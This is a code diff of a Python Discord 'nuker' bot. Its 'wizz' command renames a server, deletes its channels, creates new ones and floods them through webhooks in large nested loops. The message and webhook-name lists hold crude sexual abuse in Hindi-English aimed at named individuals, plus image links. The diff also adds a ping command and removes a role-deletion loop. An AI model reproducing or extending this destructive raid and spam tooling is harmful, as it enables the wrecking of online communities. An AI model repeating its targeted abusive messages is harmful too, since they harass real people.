@@ -13,12 +13,9 @@ MESSAGE_CONTENTS = ["@everyone @here rounak teri maa ke gile bhosde se nikle hue
 "@everyone @here https://cdn.discordapp.com/attachments/1031120803602903062/1031175506651000862/20221016_173052.jpg",
 "@everyone @here https://media.discordapp.net/attachments/1066427117262356543/1066427169573711882/IMG-20230121-WA0037.jpg"]
 
-WEBHOOK_NAMES = ["@everyone @here rounak teri maa ke gile bhosde se nikle hue hijde tu or tere srvr ki ma ki chut",
-"@everyone @here nikhil teri amma lwdi h😃 jo khet m mrwane jaati h mumfail ke tel se or teri bndi mere lund pe apni gand ghisti h aake",
-"@everyone @here sherr (Tharki loda) Teri bs taange bhr aayi h tera bheja abhi v teri maa ke bhosde m atka hua h",
-"@everyone @here Server chud gya.ab rounak ki mummy ki baari 🤣",
-"@everyone @here https://cdn.discordapp.com/attachments/1031120803602903062/1031175506651000862/20221016_173052.jpg",
-"@everyone @here https://media.discordapp.net/attachments/1066427117262356543/1066427169573711882/IMG-20230121-WA0037.jpg"]
+WEBHOOK_NAMES = ["Love from Ankush & Paracetamol",
+"Sher ki ma ki chut me loda",
+"Nikhil's mom fucked up"]
 
 client.remove_command('help')
 
@@ -53,6 +50,11 @@ async def dm(ctx, *, message:str):
     except:
 
       print(f"\x1b[38;5;196mUnable To DM Members In {ctx.guild.name}!")
+
+@client.command()
+async def ping(ctx):
+  await ctx.send(f"`{round(client.latency*1000, 2)}ms`")
+
 
 @client.command(pass_context=True)
 
@@ -108,12 +110,6 @@ async def roles(ctx):
 async def wizz(ctx, amount=50):
   await ctx.guild.edit(name="Ankush On Top Bxby")
   channels = ctx.guild.channels
-  for role in ctx.guild.roles:
-    try:
-      await role.delete()
-      print(f"{role.name} deleted")
-    except:
-      print(f"{role.name} not deleted")
   for channel in channels:
     try:
       await channel.delete()
@@ -128,12 +124,12 @@ async def wizz(ctx, amount=50):
       print(f"[{i}] channels made")
     except:
       print("error making channels")
-  await asyncio.sleep(2)
+  # await asyncio.sleep(2)
   for i in range(100):  
     for i in range(1000):
       for channel in ctx.guild.channels:
         try:
-          webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))
+          webhook = await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))
           await webhook.send(random.choice(MESSAGE_CONTENTS), username=random.choice(WEBHOOK_NAMES))
           print(f"{channel.name} spammed")
         except:
